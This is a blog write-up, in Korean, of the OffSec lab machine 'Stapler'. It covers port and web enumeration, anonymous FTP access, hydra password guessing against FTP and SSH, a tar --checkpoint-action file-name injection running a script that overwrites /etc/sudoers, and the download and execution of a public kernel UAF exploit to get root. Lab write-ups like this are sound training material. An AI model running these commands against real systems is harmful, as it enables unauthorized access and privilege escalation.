---
title: "Stapler Writeup"
date: 2025-09-19T07:00:00+09:00
# weight: 1
# aliases: ["/first"]
tags: ["pen-testing", "hacking"]
author: "Me"
categories: ["Penetration Testing"]
# author: ["Me", "You"] # multiple authors

showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: true
description: "Offsec PGP lab Stapler Writeup"
# canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: false
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "posts/cover/offsec.png" # image path/url
    alt: "cover-image"

editPost:
    URL: "https://github.com/hynseok/blog/blob/main/content"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---

About this lab
>Utilize enumeration, web enumeration, and WordPress enumeration techniques to identify vulnerabilities. Engage in database enumeration and implement privilege escalation strategies. Additionally, harness the abuse of sudo permissions to enhance your access. This lab is designed to capitalize on your skills in vulnerability exploitation.

## Enumeration
### Nmap

command
```shell
sudo nmap -p- T4 target
```
result
```shell
Host is up (0.098s latency).
Not shown: 65523 filtered tcp ports (no-response)
PORT      STATE  SERVICE
20/tcp    closed ftp-data
21/tcp    open   ftp
22/tcp    open   ssh
53/tcp    open   domain
80/tcp    open   http
123/tcp   closed ntp
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn
666/tcp   open   doom
3306/tcp  open   mysql
12380/tcp open   unknown
```

command
```shell
nmap -sV -sC -p 21,22,80,666 -T4 target
```

result
```shell
PORT    STATE SERVICE    VERSION
21/tcp  open  ftp        vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.45.175
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
22/tcp  open  ssh        OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)
|   256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)
|_  256 6d:01:b7:73:ac:b0:93:6f:fa:b9:89:e6:ae:3c:ab:d3 (ED25519)
80/tcp  open  http       PHP cli server 5.5 or later
|_http-title: 404 Not Found
666/tcp open  pkzip-file .ZIP file
| fingerprint-strings: 
|   NULL: 
|     message2.jpgUT 
|     QWux
|     "DL[E
|     #;3[
|     \xf6
|     u([r
|     qYQq
|     Y_?n2
|     3&M~{
|     9-a)T
|     L}AJ
|_    .npy.9
```
- ftp, ssh 포트를 포함하여 꽤나 많은 포트가 열려있는 것을 확인할 수 있습니다.

### Gobuster

command
```shell
gobuster dir -u http://target -w /usr/share/wordlists/dirb/big.txt -t 50
```

result
```shell
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://target
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.bashrc              (Status: 200) [Size: 3771]
/.profile             (Status: 200) [Size: 675]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
```
- 아파치 웹서버 외 별다른 내용이 없었습니다.

![stapler-1.png](images/stapler/stapler-1.png)
- nmap enumeration시 확인했던 `12380`포트에서 웹페이지가 발견되어 다시 디렉토리 enumeration을 해 보았습니다.

command
```shell
gobuster dir -u http://target:12380 -w /usr/share/wordlists/dirb/big.txt -t 50
```

result
- 응답의 긴 length로 인해 body read도중 connection이 끊기는 문제가 발생했습니다.

## Exploitation

### Anonymous FTP
```shell
ftp taget
```
- anonymous ftp 로그인을 합니다.
``` shell
get note
```
- note 라는 파일이 존재하였습니다.
```shell
cat note                
Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.
```
- `elly`라는 유저가 존재하였고, 이에 대한 패스워드 크래킹 공격을 시도합니다.

### Password Cracking
```shell
hydra -l elly -e nsr ftp://target
```
- `-e nsr`옵션은 로그인 시 null, same, reverse, 즉 패스워드를 입력하지 않거나 유저네임과 같은 패스워드, 유저네임을 거꾸로한 패스워드를 입력 시도해보는 옵션입니다.

```shell
[Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-14 13:54:16
[WARNING] Restorefile
```
- `elly` 유저의 패스워드는 `ylle`임을 알 수 있었습니다.

```shell
ftp target
Name (target:kali): elly
331 Please specify the password.
Password: 
230 Login successful.
```
- 로그인을 시도한 이후 passwd 파일을 가져옵니다.

```shell
cat passwd | awk -F: '{print $1}' > usernames.txt
```
- passwd 파일에서 유저네임만 추출합니다.

```shell
hydra -e nsr -L usernames.txt -t 4 ssh://target

...
[STATUS] 45.00 tries/min, 90 tries in 00:02h, 93 to do in 00:03h, 4 active
[22][ssh] host: target   login: SHayslett   password: SHayslett
[STATUS] 44.33 tries/min, 133 tries in 00:03h, 50 to do in 00:02h, 4 active
[STATUS] 45.50 tries/min, 182 tries in 00:04h, 1 to do in 00:01h, 4 active
1 of 1 target successfully completed, 1 valid password found
```
- 공격 대상 머신으로의 ssh `SHayslett:SHayslett` 계정 정보를 찾았습니다.

## Privilege Escalation

linpeas 스캔 결과 `/usr/local/sbin/cron-logrotate.sh `가 writable한 것을 확인했습니다.

```shell
vi evil.sh

#!/bin/bash
echo 'SHayslett ALL=(root) NOPASSWD: ALL' > /etc/sudoers

chmod +x evil.sh
```

```shell
touch '/home/SHayslett/--checkpoint=1'; touch '/home/SHayslett/--checkpoint-action=exec=sh evil.sh'
```

- `sudoers` 파일을 덮어씌우는 것을 시도해 보았지만, 성공하지 못했습니다.

[Linux: UAF via double-fdput() in bpf(BPF_PROG_LOAD) error path [42452340] - Project Zero](https://project-zero.issues.chromium.org/issues/42452340)

```shell
wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip
unzip 39772.zip
tar -xvf exploit.tar 
./compile.sh
./doubleput 
```
- BPF 맵의 UAF 취약점을 활용한 exploit으로 root 권한을 얻어낼 수 있었습니다.
